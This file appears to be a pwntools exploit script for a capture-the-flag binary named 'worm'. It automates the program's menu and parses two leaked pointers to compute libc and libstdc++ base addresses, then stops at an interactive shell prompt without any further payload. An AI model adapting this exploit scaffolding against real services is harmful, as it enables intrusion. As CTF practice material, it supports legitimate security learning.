from pwn import *
from icecream import ic

elf = exe = ELF("./worm")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def create(name):
    ru("5) Exit")
    sl("1")
    ru("Enter your worm name:")
    sl(name)

def eat(eater, eaten):
    ru("5) Exit")
    sl("2")
    ru("Which worm do you want to be the eater?")
    sl(str(eater))
    ru("Which worm do you want to eat?")
    sl(str(eaten))

def rename(ind, name):
    ru("5) Exit")
    sl("3")
    ru("Which worm do you want to rename?")
    sl(str(ind))
    ru("Enter your string:")
    sl(name)

def get(ind):
    ru("5) Exit")
    sl("4")
    ru("Which do you want to get?")
    sl(str(ind))

def exit():
    ru("5) Exit")
    sl("5")

ru("Free leak: ")
libc.address = int(re(14).decode(), 16) - 0x1feac0
ru("Free leak: ")
libcpp_base = int(re(14).decode(), 16) - 0x262310

ic(hex(libc.address))
ic(hex(libcpp_base))

i()
